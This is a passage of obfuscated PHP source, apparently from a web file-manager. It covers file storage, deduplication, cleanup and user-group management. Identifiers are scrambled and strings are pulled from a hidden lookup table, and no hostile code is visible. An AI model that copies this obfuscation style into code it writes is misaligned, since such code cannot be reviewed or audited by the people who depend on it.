$_SERVER[ë¦»ºéÌ]; $Åû·ãôõ = IO::init($ƒ²™º“”[8]); $©Ğ–šø = $this->makeFilePath($ö¨Òµşæ, $Åû·ãôõ, $”»ª¸¡‡, $õ»†é); $ ÂÏ˜é = $Åû·ãôõ->pathFather($©Ğ–šø); static $œõ©…Ø¯ = false; $’ß®ÎëÏ = $ƒ²™º“”[1851] . md5($ ÂÏ˜é); if (!$œõ©…Ø¯ && !Cache::get($’ß®ÎëÏ)) { $œõ©…Ø¯ = !0; $–†±À‹û = IO::mkdir($ ÂÏ˜é); if (!IO::exist($–†±À‹û . $ƒ²™º“”[781])) { IO::mkfile($–†±À‹û . $ƒ²™º“”[781]); } Cache::set($’ß®ÎëÏ, 1, 3600 * 2); } return $©Ğ–šø; } public function makeFilePath($‰ô„ù×, $”¥¹×¹¬, $‹æÑë¼â = false, $ªà½¼î = false) { $ÚÒû…¶Ó =& $_SERVER[ë¦»ºéÌ]; $ùÏËù‡Ú = Model($ÚÒû…¶Ó[754])->get($ÚÒû…¶Ó[1852]); $‚†Èùğæ = KodIO::defaultIO() . date($ÚÒû…¶Ó[1853]); $“ğ›–² = $‚†Èùğæ . rand_string(5) . short_id(100); $‰ô„ù× = str_replace($ÚÒû…¶Ó[8], $ÚÒû…¶Ó[11], KodIO::clear($‰ô„ù×)); $¨À²»ÜÊ = $”¥¹×¹¬->ext($‰ô„ù×); if (!$‰ô„ù×) { $ùÏËù‡Ú = $ÚÒû…¶Ó[1854]; } switch ($ùÏËù‡Ú) { case $ÚÒû…¶Ó[1855]: $“ğ›–² = $“ğ›–² . $ÚÒû…¶Ó[10] . $”¥¹×¹¬->ext($‰ô„ù×); if ($¨À²»ÜÊ == $ÚÒû…¶Ó[1793]) { $“ğ›–² .= $ÚÒû…¶Ó[1528]; } break; case $ÚÒû…¶Ó[1856]: $œÖ«Şğƒ = Model($ÚÒû…¶Ó[754])->get($ÚÒû…¶Ó[755]); $á÷‰şá = substr(md5($ÚÒû…¶Ó[756] . $œÖ«Şğƒ . date($ÚÒû…¶Ó[732])), 0, 8); $éâİ«Û = KodIO::defaultDriver(); $‚†Èùğæ = $ÚÒû…¶Ó[1207] . $éâİ«Û[$ÚÒû…¶Ó[403]] . $ÚÒû…¶Ó[412] . date($ÚÒû…¶Ó[1857]) . $á÷‰şá . $ÚÒû…¶Ó[8]; if ($¨À²»ÜÊ == $ÚÒû…¶Ó[1793]) { $‰ô„ù× .= $ÚÒû…¶Ó[1528]; } $İ…ÅŠ¼ì = $ÚÒû…¶Ó[1858] . $‚†Èùğæ . $‰ô„ù×; CacheLock::lock($İ…ÅŠ¼ì); $“ğ›–² = $‚†Èùğæ . $‰ô„ù×; if (IO::exist($‚†Èùğæ . $‰ô„ù×)) { $½«”¡Ã = substr($‰ô„ù×, 0, strlen($‰ô„ù×) - strlen($¨À²»ÜÊ)); $Ğªé¶Â¿ = $ªà½¼î ? substr($ªà½¼î, 0, 5) : ($‹æÑë¼â ? substr($‹æÑë¼â, 0, 5) : rand_string(5)); $“ğ›–² = $‚†Èùğæ . $½«”¡Ã . $Ğªé¶Â¿ . $ÚÒû…¶Ó[10] . $¨À²»ÜÊ; } if (IO::isTypeObject($“ğ›–²) && !IO::isUploadServer($“ğ›–²)) { if (IO::exist($“ğ›–²)) { return $“ğ›–²; } $¤İÁ“Œ÷ = IO::setContent($“ğ›–², $ÚÒû…¶Ó[12]); if (!$¤İÁ“Œ÷) { show_json($ÚÒû…¶Ó[1859], !1); } } CacheLock::unlock($İ…ÅŠ¼ì); break; case $ÚÒû…¶Ó[1854]: break; default: break; } return $“ğ›–²; } public function addFileByRemote($ø¢íÂ, $œ³é¥÷², $Ôô¬–üÕ = array()) { $‰É‰úö =& $_SERVER[ë¦»ºéÌ]; if (!IO::exist($ø¢íÂ)) { return !1; } $åÎÛÄöİ = $Ôô¬–üÕ[$‰É‰úö[181]] ? $Ôô¬–üÕ[$‰É‰úö[181]] : $‰É‰úö[12]; $±¶äÚ° = IO::hashMd5($ø¢íÂ, $åÎÛÄöİ); $§ãÊ¢Ù = KodIO::defaultDriver(); $¸¾ÃãşĞ = array($‰É‰úö[581] => IO::size($ø¢íÂ), $‰É‰úö[1860] => 1, $‰É‰úö[423] => $œ³é¥÷², $‰É‰úö[792] => $§ãÊ¢Ù[$‰É‰úö[403]], $‰É‰úö[424] => $ø¢íÂ, $‰É‰úö[1861] => $Ôô¬–üÕ[$‰É‰úö[182]] ? $Ôô¬–üÕ[$‰É‰úö[182]] : IO::hashSimple($ø¢íÂ), $‰É‰úö[1862] => $±¶äÚ° ? $±¶äÚ° : $åÎÛÄöİ); if ($¸¢îÁ¦× = $this->addFileCheckExist($¸¾ÃãşĞ[$‰É‰úö[182]], $¸¾ÃãşĞ[$‰É‰úö[181]], $¸¾ÃãşĞ[$‰É‰úö[90]])) { return $¸¢îÁ¦×; } return $this->addFileData($¸¾ÃãşĞ); } private function addFileData($„¤øÂÁß) { $¶½º² =& $_SERVER[ë¦»ºéÌ]; if (!$„¤øÂÁß) { return !1; } $„¤øÂÁß[$¶½º²[90]] = intval($„¤øÂÁß[$¶½º²[90]]); if (!$„¤øÂÁß[$¶½º²[90]] && strlen($„¤øÂÁß[$¶½º²[182]]) > 32) { $„¤øÂÁß[$¶½º²[90]] = intval(substr($„¤øÂÁß[$¶½º²[182]], 32)); } $¾Û“Œ“ã = $this->add($„¤øÂÁß); return $this->find($¾Û“Œ“ã); } public function addFile($Ø×Ì³‹, $æƒœ×Öš, $÷“ÈøÄ = false) { $¬²ğ˜Ï =& $_SERVER[ë¦»ºéÌ]; $û•€°º = IO::hashSimple($Ø×Ì³‹); $³ŞÁ–³± = IO::size($Ø×Ì³‹); $–¸«å÷· = $³ŞÁ–³± <= 1024 * 1024 * 10 ? IO::hashMd5($Ø×Ì³‹) : $¬²ğ˜Ï[12]; $¯­İ¨ãã = $¬²ğ˜Ï[1863] . $û•€°º; CacheLock::lock($¯­İ¨ãã); if ($–¸«å÷· && $û•€°º) { $‹·ÄêÉ = $this->addFileCheckExist($û•€°º, $–¸«å÷·, $³ŞÁ–³±); if ($‹·ÄêÉ) { CacheLock::unlock($¯­İ¨ãã); return $‹·ÄêÉ; } } $ˆ°ü˜¼÷ = $this->addFileMake($Ø×Ì³‹, $³ŞÁ–³±, $û•€°º, $–¸«å÷·, $æƒœ×Öš, $÷“ÈøÄ); $Øº¿š… = $this->addFileData($ˆ°ü˜¼÷); CacheLock::unlock($¯­İ¨ãã); if (!$–¸«å÷· && $Øº¿š…) { $this->fileMd5Check($Øº¿š…); } return $Øº¿š…; } private function fileMd5Check($ÈçÒ·ƒ) { $‹¬ò¡«ô =& $_SERVER[ë¦»ºéÌ]; $¸ïÅŒÚ = array($ÈçÒ·ƒ[$‹¬ò¡«ô[469]], $ÈçÒ·ƒ[$‹¬ò¡«ô[88]]); $êÔæ”ø˜ = $‹¬ò¡«ô[1864] . $ÈçÒ·ƒ[$‹¬ò¡«ô[88]]; $Àœ—«öÜ = $‹¬ò¡«ô[1865] . $ÈçÒ·ƒ[$‹¬ò¡«ô[469]]; $½ù˜Î° = TaskQueue::add($‹¬ò¡«ô[1866], $¸ïÅŒÚ, $êÔæ”ø˜, $Àœ—«öÜ); if (!$½ù˜Î°) { $this->fileMd5Set($ÈçÒ·ƒ[$‹¬ò¡«ô[469]], $ÈçÒ·ƒ[$‹¬ò¡«ô[88]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($·íøÊÕ, $´¦èÃõÁ) { $Ñ½½¡ª¨ =& $_SERVER[ë¦»ºéÌ]; $÷ˆÎÈ¼ô = $this->find($·íøÊÕ); if (!$÷ˆÎÈ¼ô || $÷ˆÎÈ¼ô[$Ñ½½¡ª¨[181]]) { return; } $«éÚõ¡ = IO::hashMd5($´¦èÃõÁ); if (!$«éÚõ¡) { return $Ñ½½¡ª¨[12]; } $this->where(array($Ñ½½¡ª¨[469] => $·íøÊÕ))->save(array($Ñ½½¡ª¨[181] => $«éÚõ¡)); } public function addFileMake($µ¿²‡¸£, $Ş·™¹‡¶, $ÓÄŞĞ½, $ã§¦«¸, $Ş‚–è–¼, $µ²¹ÃÜÑ) { $Ñ¢‹±ÛÈ =& $_SERVER[ë¦»ºéÌ]; $æŒ‡ü÷ = $this->createFileName($Ş‚–è–¼, $ÓÄŞĞ½, $ã§¦«¸); $Éìıç—„ = get_path_father($æŒ‡ü÷); $éã’õÕé = get_path_this($æŒ‡ü÷); if ($µ²¹ÃÜÑ) { $„ˆÍÊÜ² = IO::move($µ¿²‡¸£, $Éìıç—„, !1, $éã’õÕé); } else { $„ˆÍÊÜ² = IO::copy($µ¿²‡¸£, $Éìıç—„, !1, $éã’õÕé); } if (!$„ˆÍÊÜ²) { return !1; } $ùØö™¤œ = KodIO::defaultDriver(); $²îÙ†Ğ = array($Ñ¢‹±ÛÈ[581] => $Ş·™¹‡¶, $Ñ¢‹±ÛÈ[1860] => 1, $Ñ¢‹±ÛÈ[423] => $Ş‚–è–¼, $Ñ¢‹±ÛÈ[792] => $ùØö™¤œ[$Ñ¢‹±ÛÈ[403]], $Ñ¢‹±ÛÈ[424] => $æŒ‡ü÷, $Ñ¢‹±ÛÈ[1861] => $ÓÄŞĞ½, $Ñ¢‹±ÛÈ[1862] => $ã§¦«¸); return $²îÙ†Ğ; } public function addFileCheckExist($³ïûİÕê, $¦îÂªıô, $ÍÂ”©í) { $£µö³î =& $_SERVER[ë¦»ºéÌ]; $Ù€‘¸éÎ = $this->findByHash($³ïûİÕê, $¦îÂªıô); if (!$Ù€‘¸éÎ) { return !1; } $£ºĞÛÈÇ = array($£µö³î[1860] => intval($Ù€‘¸éÎ[$£µö³î[1867]]) + 1, $£µö³î[581] => $ÍÂ”©í); $this->where(array($£µö³î[470] => $Ù€‘¸éÎ[$£µö³î[469]]))->save($£ºĞÛÈÇ); return $Ù€‘¸éÎ; } public function remove($Óù×’ôß) { $this->linkCountChange($Óù×’ôß, !1); $this->clearEmpty(); return !0; } public function linkAdd($ºÙèãÏÇ) { $this->linkCountChange($ºÙèãÏÇ, !0); } public function linkCountChange($¦î–±„·, $¿Ûä¦Èú) { $ï´âÆˆ— =& $_SERVER[ë¦»ºéÌ]; if (!$¦î–±„·) { return; } if (!is_array($¦î–±„·)) { $¦î–±„· = array($¦î–±„·); } $ìö¥ã¼® = array(); foreach ($¦î–±„· as $‚ÒÃ¶†Ï) { $¾¦ù“î© = $‚ÒÃ¶†Ï . $ï´âÆˆ—[12]; if (!$ìö¥ã¼®[$¾¦ù“î©]) { $ìö¥ã¼®[$¾¦ù“î©] = 0; } $ìö¥ã¼®[$¾¦ù“î©]++; } $¿Ç´¹¼Î = array(); foreach ($ìö¥ã¼® as $‚ÒÃ¶†Ï => $ÊşñÚÚƒ) { $¾¦ù“î© = $ÊşñÚÚƒ . $ï´âÆˆ—[12]; if (!$¿Ç´¹¼Î[$¾¦ù“î©]) { $¿Ç´¹¼Î[$¾¦ù“î©] = array(); } $¿Ç´¹¼Î[$¾¦ù“î©][] = $‚ÒÃ¶†Ï; } foreach ($¿Ç´¹¼Î as $ÊşñÚÚƒ => $÷Ç¼œ‘˜) { if (!$÷Ç¼œ‘˜) { continue; } $ÊşñÚÚƒ = $¿Ûä¦Èú ? $ÊşñÚÚƒ : -intval($ÊşñÚÚƒ); $ĞãÄç¯ì = array($ï´âÆˆ—[469] => array($ï´âÆˆ—[7], $÷Ç¼œ‘˜)); if ($ÊşñÚÚƒ < 0) { $ĞãÄç¯ì[$ï´âÆˆ—[1867]] = array($ï´âÆˆ—[995], abs($ÊşñÚÚƒ)); } $this->where($ĞãÄç¯ì)->setAdd($ï´âÆˆ—[1867], $ÊşñÚÚƒ); } } public function findByHash($ííè—æ, $¸Æş§èë = false) { $ßí½¨ã =& $_SERVER[ë¦»ºéÌ]; if (!$ííè—æ && !$¸Æş§èë) { return !1; } $Öóñ’à = array($ßí½¨ã[1861] => $ííè—æ); if ($¸Æş§èë) { $Öóñ’à = array($ßí½¨ã[1862] => $¸Æş§èë); } return $this->order($ßí½¨ã[1868])->where($Öóñ’à)->find(); } public function clearEmpty($ë•íÓ = 0) { $Ğ”¥¥ñ =& $_SERVER[ë¦»ºéÌ]; $Ï³ËÅ¶ = time() - 3600 * 24 * $ë•íÓ; $¹ÔËÛ¥Ë = $Ğ”¥¥ñ[1869] . $Ï³ËÅ¶; $”€âšêù = $this->where($¹ÔËÛ¥Ë)->select(); if (!$”€âšêù) { return; } $÷ì¸²œ’ = new Task($Ğ”¥¥ñ[1870], $Ğ”¥¥ñ[12], count($”€âšêù)); foreach ($”€âšêù as $œé¯—°‹) { $÷ì¸²œ’->update(1); $this->resetFile($œé¯—°‹); } $÷ì¸²œ’->end(); } public function resetFile($…¥šğ¿ò) { $á¹®·¿ =& $_SERVER[ë¦»ºéÌ]; $³¬÷Ğ„ö = array($á¹®·¿[470] => $…¥šğ¿ò[$á¹®·¿[469]]); $Õå¢Í±Õ = Model($á¹®·¿[1305])->where($³¬÷Ğ„ö)->count(); $ìãÒ®¡ğ = Model($á¹®·¿[1871])->where($³¬÷Ğ„ö)->count(); $¨ŞøßÛÜ = intval($Õå¢Í±Õ) + intval($ìãÒ®¡ğ); if ($¨ŞøßÛÜ == 0) { IO::remove($…¥šğ¿ò[$á¹®·¿[88]]); Model($á¹®·¿[1872])->delete($…¥šğ¿ò[$á¹®·¿[469]]); $this->where($³¬÷Ğ„ö)->delete(); $this->metaSet($…¥šğ¿ò[$á¹®·¿[469]], null, null); return; } if ($…¥šğ¿ò[$á¹®·¿[1867]] != $¨ŞøßÛÜ) { $this->where($³¬÷Ğ„ö)->save(array($á¹®·¿[1860] => $¨ŞøßÛÜ)); } } public function storageInfo($Ïö¾Ê§Î = false) { $†ÛÇ¢Œ† =& $_SERVER[ë¦»ºéÌ]; $Ñ¢ÓŞ™‚ = $this->count() + 0.0; $ğò÷ñõÊ = 0; $Ûíü ø = 1; $™ÎÙ‚òã = 0; $Úùºí±— = 5000; for ($ÊÑºû›æ = 0; $ÊÑºû›æ < $Ñ¢ÓŞ™‚; $ÊÑºû›æ = $ÊÑºû›æ + $Úùºí±—) { $†ì¾šÚã = $this->limit($ÊÑºû›æ, $ÊÑºû›æ + $Úùºí±—)->select(); foreach ($†ì¾šÚã as $½æì÷½³) { $Ûíü ø += $½æì÷½³[$†ÛÇ¢Œ†[90]] * $½æì÷½³[$†ÛÇ¢Œ†[1867]]; $ğò÷ñõÊ += $½æì÷½³[$†ÛÇ¢Œ†[90]] * ($½æì÷½³[$†ÛÇ¢Œ†[1867]] - 1); $™ÎÙ‚òã += $½æì÷½³[$†ÛÇ¢Œ†[1867]]; } } $íÀ³Ìî = array($†ÛÇ¢Œ†[1873] => $Ûíü ø, $†ÛÇ¢Œ†[1874] => $ğò÷ñõÊ, $†ÛÇ¢Œ†[1875] => $ğò÷ñõÊ / $Ûíü ø, $†ÛÇ¢Œ†[94] => $Ñ¢ÓŞ™‚, $†ÛÇ¢Œ†[1876] => $™ÎÙ‚òã); return $íÀ³Ìî; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\x75\x70"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\141\155\145" => "\x67\x72\157\x75\x70\137\x6d\x65\x74\141", "\155\145\164\x61\106\x69\x65\x6c\x64" => "\147\x72\157\165\160\x49\x44"); protected function cacheFunctionAlias($ÜåÓªÅÂ) { $ç èšñí =& $_SERVER[ë¦»ºéÌ]; return array($ç èšñí[1877] => array($ÜåÓªÅÂ[0], $ç èšñí[1878]), $ç èšñí[1879] => array($ÜåÓªÅÂ[0], $ç èšñí[1880])); } protected function getInfo($¤Ê²ûˆÆ, $ş¨’’öú = false) { $¯Öé¶…‘ = $this->getInfoSimple($¤Ê²ûˆÆ); if (!$¯Öé¶…‘) { return !1; } if ($ş¨’’öú) { return $this->_listDataApplyItem($¯Öé¶…‘); } return $this->cacheFunctionGet($_SERVER[ë¦»ºéÌ][1881], $¤Ê²ûˆÆ); } protected function getInfoSimple($°ç—ƒ¢‚, $ÌääÙĞ = false) { $â¦¹ÔÀ =& $_SERVER[ë¦»ºéÌ]; if ($ÌääÙĞ) { $µ¿ÀÛ³Ê = array($â¦¹ÔÀ[1800] => intval($°ç—ƒ¢‚)); $Ïä¬¡³ì = $this->where($µ¿ÀÛ³Ê)->find(); return is_array($Ïä¬¡³ì) ? $Ïä¬¡³ì : array(); } return $this->cacheFunctionGet($â¦¹ÔÀ[1882], $°ç—ƒ¢‚); } protected function groupAdd($¶—¥Ğ¾Æ) { $®’ªê–ı =& $_SERVER[ë¦»ºéÌ]; if (!$¶—¥Ğ¾Æ[$®’ªê–ı[500]] && isset($¶—¥Ğ¾Æ[$®’ªê–ı[1800]]) && $¶—¥Ğ¾Æ[$®’ªê–ı[1800]] == 1) { if ($–ÙŸÔä£ = $this->getInfoSimple($¶—¥Ğ¾Æ[$®’ªê–ı[1800]], !0)) { return $¶—¥Ğ¾Æ[$®’ªê–ı[1800]]; } } else { $–ÙŸÔä£ = $this->getInfoSimple($¶—¥Ğ¾Æ[$®’ªê–ı[500]]); if (!$–ÙŸÔä£) { return !1; } } $ƒƒûğÃ™ = $®’ªê–ı[533]; if ($–ÙŸÔä£[$®’ªê–ı[523]]) { $ƒƒûğÃ™ = $–ÙŸÔä£[$®’ªê–ı[523]] . $–ÙŸÔä£[$®’ªê–ı[1800]] . $®’ªê–ı[60]; } $¶µë› = array($®’ªê–ı[423] => $this->groupNameAuto($¶—¥Ğ¾Æ[$®’ªê–ı[500]], $¶—¥Ğ¾Æ[$®’ªê–ı[42]]), $®’ªê–ı[404] => $¶—¥Ğ¾Æ[$®’ªê–ı[500]], $®’ªê–ı[586] => $ƒƒûğÃ™, $®’ªê–ı[1883] => $¶—¥Ğ¾Æ[$®’ªê–ı[1787]], $®’ªê–ı[1884] => 0, $®’ªê–ı[1804] => 0); if (isset($¶—¥Ğ¾Æ[$®’ªê–ı[1823]])) { $¶µë›[$®’ªê–ı[1823]] = $¶—¥Ğ¾Æ[$®’ªê–ı[1823]]; } else { $¯’Âİî = $this->max($®’ªê–ı[1823]); if (!$¯’Âİî) { $¯’Âİî = 0; } $¶µë›[$®’ªê–ı[1823]] = $¯’Âİî + 1; } if (!empty($¶—¥Ğ¾Æ[$®’ªê–ı[1800]])) { $¶µë›[$®’ªê–ı[1800]] = $¶—¥Ğ¾Æ[$®’ªê–ı[1800]]; } $Ÿ±Ì¥€ = $this->add($¶µë›); $this->setNamePinyin($Ÿ±Ì¥€, $¶µë›[$®’ªê–ı[42]]); if (isset($¶—¥Ğ¾Æ[$®’ªê–ı[1885]])) { $this->metaSet($Ÿ±Ì¥€, array($®’ªê–ı[1885] => $¶—¥Ğ¾Æ[$®’ªê–ı[1885]], $®’ªê–ı[1886] => $¶—¥Ğ¾Æ[$®’ªê–ı[1886]])); unset($¶—¥Ğ¾Æ[$®’ªê–ı[1885]]); unset($¶—¥Ğ¾Æ[$®’ªê–ı[1886]]); } Model($®’ªê–ı[1305])->groupRootAdd($Ÿ±Ì¥€); return $Ÿ±Ì¥€; } protected function groupEdit($ª …ŒÔğ, $›‡É÷Ï) { $’¬›·¶Ã =& $_SERVER[ë¦»ºéÌ]; $èÃÍ¢–î = $this->getInfoSimple($ª …ŒÔğ); if (!$èÃÍ¢–î) { return !1; } if (!empty($›‡É÷Ï[$’¬›·¶Ã[500]])) { $«å¤«ŒÃ = $this->getInfoSimple($›‡É÷Ï[$’¬›·¶Ã[500]]); if (!$«å¤«ŒÃ) { return !1; } if ($èÃÍ¢–î[$’¬›·¶Ã[1800]] == $«å¤«ŒÃ[$’¬›·¶Ã[1800]]) { return !1; } if ($›‡É÷Ï[$’¬›·¶Ã[500]] != $èÃÍ¢–î[$’¬›·¶Ã[500]]) { if ($«å¤«ŒÃ[$’¬›·¶Ã[523]] !== $èÃÍ¢–î[$’¬›·¶Ã[523]] && strpos($«å¤«ŒÃ[$’¬›·¶Ã[523]], $èÃÍ¢–î[$’¬›·¶Ã[523]] . $èÃÍ¢–î[$’¬›·¶Ã[1800]] . $’¬›·¶Ã[60]) === 0) { return !1; } $›‡É÷Ï[$’¬›·¶Ã[586]] = $«å¤«ŒÃ[$’¬›·¶Ã[523]] . $›‡É÷Ï[$’¬›·¶Ã[500]] . $’¬›·¶Ã[60]; $this->_changeChildLevel($èÃÍ¢–î, $«å¤«ŒÃ); } } if (isset($›‡É÷Ï[$’¬›·¶Ã[42]])) { $this->setNamePinyin($ª …ŒÔğ, $›‡É÷Ï[$’¬›·¶Ã[42]]); } if (isset($›‡É÷Ï[$’¬›·¶Ã[1885]])) { $this->metaSet($ª …ŒÔğ, array($’¬›·¶Ã[1885] => $›‡É÷Ï[$’¬›·¶Ã[1885]], $’¬›·¶Ã[1886] => $›‡É÷Ï[$’¬›·¶Ã[1886]])); unset($›‡É÷Ï[$’¬›·¶Ã[1885]]); unset($›‡É÷Ï[$’¬›·¶Ã[1886]]); } $this->_clearChildrenCache($èÃÍ¢–î); return $this->where(array($’¬›·¶Ã[1887] => $ª …ŒÔğ))->save($›‡É÷Ï); } private function _clearChildrenCache($¾Öëâë”) { $öÒ°ºñç =& $_SERVER[ë¦»ºéÌ]; $äáì„ = array($öÒ°ºñç[586] => array($öÒ°ºñç[546], $¾Öëâë”[$öÒ°ºñç[523]] . $¾Öëâë”[$öÒ°ºñç[1800]] . $öÒ°ºñç[547])); $Â¥óú³— = $this->field($öÒ°ºñç[1800])->where($äáì„)->select(); foreach ($Â¥óú³— as $Úº×îàƒ) { $this->_clearCache($Úº×îàƒ[$öÒ°ºñç[1800]]); } } private function _clearCache($¥¼É›Ëì) { $¢•Û²åá =& $_SERVER[ë¦»ºéÌ]; $this->cacheFunctionClear($¢•Û²åá[1881], $¥¼É›Ëì); $this->cacheFunctionClear($¢•Û²åá[1882], $¥¼É›Ëì); } private function _changeChildLevel($©­şè‚, $«Ò­Â–œ, $µÜ®ü›Ô = false) { $üÔÎ¼¦Ş =& $_SERVER[ë¦»ºéÌ]; $µ¨—Ìßä = $©­şè‚[$üÔÎ¼¦Ş[523]] . $©­şè‚[$üÔÎ¼¦Ş[1800]] . $üÔÎ¼¦Ş[60]; $Öªã ´æ = $«Ò­Â–œ[$üÔÎ¼¦Ş[523]] . $«Ò­Â–œ[$üÔÎ¼¦Ş[1800]] . $üÔÎ¼¦Ş[60] . $©­şè‚[$üÔÎ¼¦Ş[1800]] . $üÔÎ¼¦Ş[60]; if ($µÜ®ü›Ô) { $Öªã ´æ = $«Ò­Â–œ[$üÔÎ¼¦Ş[523]] . $«Ò­Â–œ[$üÔÎ¼¦Ş[1800]] . $üÔÎ¼¦Ş[60]; } $è‘â¨•¾ = array($üÔÎ¼¦Ş[586] => array($üÔÎ¼¦Ş[546], $©­şè‚[$üÔÎ¼¦Ş[523]] . $©­şè‚[$üÔÎ¼¦Ş[1800]] . $üÔÎ¼¦Ş[547])); $±ğ§’£ç = array($üÔÎ¼¦Ş[586] => array($üÔÎ¼¦Ş[595], "\162\145\160\154\x61\143\145\50\160\x61\x72\x65\x6e\164\x4c\x65\166\x65\x6c\54\x27{$µ¨—Ìßä}\47\54\47{$Öªã ´æ}\47\x29")); $this->_clearChildrenCache($©­şè‚); $this->where($è‘â¨•¾)->data($±ğ§’£ç)->save(); } public function setNamePinyin($ ¬ˆ¡Òë, $À¨‹¹ë¦ = false) { $Á·ËôŒ× =& $_SERVER[ë¦»ºéÌ]; if (!$À¨‹¹ë¦) { $º¾‘ÁĞ® = $this->getInfoSimple($ ¬ˆ¡Òë); $À¨‹¹ë¦ = $º¾‘ÁĞ®[$Á·ËôŒ×[42]]; } if (!Input::check($À¨‹¹ë¦, $Á·ËôŒ×[589])) { $this->metaSet($ ¬ˆ¡Òë, $Á·ËôŒ×[466], null); $this->metaSet($ ¬ˆ¡Òë, $Á·ËôŒ×[465], null); return; } $µòóà´Œ = array($Á·ËôŒ×[466] => str_replace($Á·ËôŒ×[63], $Á·ËôŒ×[12], Pinyin::get($À¨‹¹ë¦)), $Á·ËôŒ×[465] => Pinyin::get($À¨‹¹ë¦, $Á·ËôŒ×[590])); $this->metaSet($ ¬ˆ¡Òë, $µòóà´Œ); } protected function groupStatus($” ˜øú, $ùÇÆå½§) { $ƒ‚°É™ó =& $_SERVER[ë¦»ºéÌ]; $´ƒ„Ûà = $this->getInfoSimple($” ˜øú); if (!$´ƒ„Ûà) { return !1; } if ($ùÇÆå½§ == $ƒ‚°É™ó[99]) { $î˜áûÈû = $this->parentLevelArray($´ƒ„Ûà[$ƒ‚°É™ó[523]]); } else { $ó ëÂúö = array($ƒ‚°É™ó[586] => array($ƒ‚°É™ó[546], $´ƒ„Ûà[$ƒ‚°É™ó[523]] . $´ƒ„Ûà[$ƒ‚°É™ó[1800]] . $ƒ‚°É™ó[547])); $î˜áûÈû = $this->where($ó ëÂúö)->field($ƒ‚°É™ó[1800])->select(); $î˜áûÈû = array_to_keyvalue($î˜áûÈû, $ƒ‚°É™ó[12], $ƒ‚°É™ó[1800]); } $î˜áûÈû[] = $´ƒ„Ûà[$ƒ‚°É™ó[1800]]; $¡¹…Õ— = array(); foreach ($î˜áûÈû as $” ˜øú) { $¡¹…Õ—[] = array($ƒ‚°É™ó[1800] => $” ˜øú, $ƒ‚°É™ó[105] => $ƒ‚°É™ó[734], $ƒ‚°É™ó[380] => $ùÇÆå½§); $this->_clearCache($” ˜øú); } return Model($ƒ‚°É™ó[1888])->addAll($¡¹…Õ—, array(), !0); } protected function groupRemove($™Éï¯’Ñ) { $‰Ú¬íğ» =& $_SERVER[ë¦»ºéÌ]; $³’»œï = array($‰Ú¬íğ»[1800] => $™Éï¯’Ñ); $²İÂıü¼ = $this->where($³’»œï)->find(); if (!$²İÂıü¼ || $²İÂıü¼[$‰Ú¬íğ»[500]] == 0) { return !1; } $®‹Ğô¥Œ = $this->getInfoSimple($²İÂıü¼[$‰Ú¬íğ»[500]]); $this->_changeChildLevel($²İÂıü¼, $®‹Ğô¥Œ, !0); $this->where(array($‰Ú¬íğ»[500] => $™Éï¯’Ñ))->save(array($‰Ú¬íğ»[500] => $²İÂıü¼[$‰Ú¬íğ»[500]])); Model($‰Ú¬íğ»[1888])->where($³’»œï)->delete(); Model($‰Ú¬íğ»[1889])->where($³’»œï)->delete(); Model($‰Ú¬íğ»[809])->groupRootRemove($™Éï¯’Ñ); return $this->where($³’»œï)->delete(); } protected function groupSort($Åò×‰Ÿ€) { $ÑüøÂ²î =& $_SERVER[ë¦»ºéÌ]; $şÆá×¼¦ = array(); foreach ($Åò×‰Ÿ€ as $ÌË¢û¢Ç => $¼ä•‹÷Ÿ) { $şÆá×¼¦[] = array($ÑüøÂ²î[1800], $¼ä•‹÷Ÿ, $ÑüøÂ²î[1823], $ÌË¢û¢Ç + 1); } $this->saveAll($şÆá×¼¦); } public function listData() { $°Š§ÛÅì = $this->_makeOrder()->selectPage(50); $this->_listDataApply($°Š§ÛÅì[$_SERVER[ë¦»ºéÌ][375]]); return $°Š§ÛÅì; } private function _makeOrder($••©­åÁ = '') { $ã¬ˆ€ÊÈ =& $_SERVER[ë¦»ºéÌ]; $çôÈ­î• = array($ã¬ˆ€ÊÈ[1800], $ã¬ˆ€ÊÈ[42], $ã¬ˆ€ÊÈ[1789], $ã¬ˆ€ÊÈ[205]); $Ã†îõ“ï = array($ã¬ˆ€ÊÈ[450] => $ã¬ˆ€ÊÈ[451], $ã¬ˆ€ÊÈ[452] => $ã¬ˆ€ÊÈ[453]); $Ò¦«¾Ë˜ = Input::get($ã¬ˆ€ÊÈ[457], $ã¬ˆ€ÊÈ[7], $ã¬ˆ€ÊÈ[1804], $çôÈ­î•); $Ÿ¯ÀÇü = Input::get($ã¬ˆ€ÊÈ[458], $ã¬ˆ€ÊÈ[7], $ã¬ˆ€ÊÈ[1890], array($ã¬ˆ€ÊÈ[1890], $ã¬ˆ€ÊÈ[452])); $Ÿ¯ÀÇü = $Ã†îõ“ï[$Ÿ¯ÀÇü]; $••©­åÁ = $••©­åÁ . "{$Ò¦«¾Ë˜}\40{$Ÿ¯ÀÇü}\54\x20\x67\x72\157\x75\x70\x49\x44\40\141\x73\143"; return $this->order($••©­åÁ); } public function listChild($Ó¤óÕ) { $¥Ì¾æˆ˜ =& $_SERVER[ë¦»ºéÌ]; $ÒëØ¤»– = $this->where(array($¥Ì¾æˆ˜[500] => $Ó¤óÕ))->_makeOrder()->selectPage(200); $this->_listDataApply($ÒëØ¤»–[$¥Ì¾æˆ˜[375]]); return $ÒëØ¤»–; } public function listByID($Áù¸…§¡) { $¨ª‹¨éİ =& $_SERVER[ë¦»ºéÌ]; if (!$Áù¸…§¡) { return array(); } $’µ¤Õ¦ü = array($¨ª‹¨éİ[1800] => array($¨ª‹¨éİ[7], $Áù¸…§¡)); $Û¸±ÈŞ™ = $this->where($’µ¤Õ¦ü)->select(); $Û¸±ÈŞ™ = array_sort_keep($Û¸±ÈŞ™, $¨ª‹¨éİ[1800], $Áù¸…§¡); $this->_listDataApply($Û¸±ÈŞ™); return $Û¸±ÈŞ™; } public function listSearch($¨„òÉ‘Ù) { $íĞ‘êèß =& $_SERVER[ë¦»ºéÌ]; $Íñ¬·´ = $¨„òÉ‘Ù[$íĞ‘êèß[1891]]; $˜ïƒ“‚ = isset($¨„òÉ‘Ù[$íĞ‘êèß[1892]]) ? $¨„òÉ‘Ù[$íĞ‘êèß[1892]] : !1; if (!trim($Íñ¬·´)) { return !1; } $Íñ¬·´ = str_replace($íĞ‘êèß[1893], $íĞ‘êèß[1894], $Íñ¬·´); $üÆÖâê = array($íĞ‘êèß[1800] => array($íĞ‘êèß[389], 